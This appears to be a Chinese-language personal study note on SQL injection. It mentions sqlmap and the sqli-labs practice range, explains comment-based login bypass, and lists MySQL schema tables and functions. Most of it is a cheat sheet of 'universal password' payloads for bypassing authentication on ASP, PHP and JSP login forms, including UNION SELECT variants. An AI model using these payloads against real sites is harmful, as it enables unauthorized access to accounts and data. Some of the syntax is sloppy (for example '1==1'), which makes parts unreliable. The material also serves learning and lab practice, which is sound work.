# sql注入工具

## sqlmap

python 编写 github

## Sqlli-lab

sql注入靶场 php项目 github 需要phpstydu 程序

# 漏洞利用

## -- 注释掉后续条件

```sql
-- 如：
select * from user where username = 'admin' and password = 'admin'
-- 输入《' or 1==1 -- 》 构造
select * from user where username = '' or 1==1 -- 'and password = 'admin'
```

# mysql

## 表

1. schemata
2. tables
3. columns

## 常用函数

1. user()：查看当前Mysq登录用户名
2. database()：查看当前使用Mysq数据库名
3. version()：查看当前Mysq版本
4. limit m,n ：第m(0开始)条数据开始，查询n条
5. 注释：
   1. #：
   2. -- ：浏览器使用 --%20
   3. /**/：
   4. 内联注释：/*! sql */ 

## 漏洞函数



# 万能密码

```
asp aspx万能密码
1："or "a"="a
2： ')or('a'='a
3：or 1=1--
4：'or 1=1--
5：a'or' 1=1--
6："or 1=1--
7：'or'a'='a
8："or"="a'='a
9：'or''='
10：'or'='or'
11: 1 or '1'='1'=1
12: 1 or '1'='1' or 1=1
13: 'OR 1=1%00
14: "or 1=1%00
15: 'xor
16: 新型万能登陆密码
	用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin） 密码 1
	Username=-1%cf' union select 1,1,1 as password,1,1,1 %23 Password=1
17: ..admin' or 'a'='a 密码随便


PHP万能密码
'or'='or'
'or 1=1/*  字符型 GPC是否开都可以使用
User: something
Pass: ' OR '1'='1


jsp 万能密码
1'or'1'='1

admin' OR 1=1/*
用户名：admin    系统存在这个用户的时候 才用得上
密码：1'or'1'='1
```

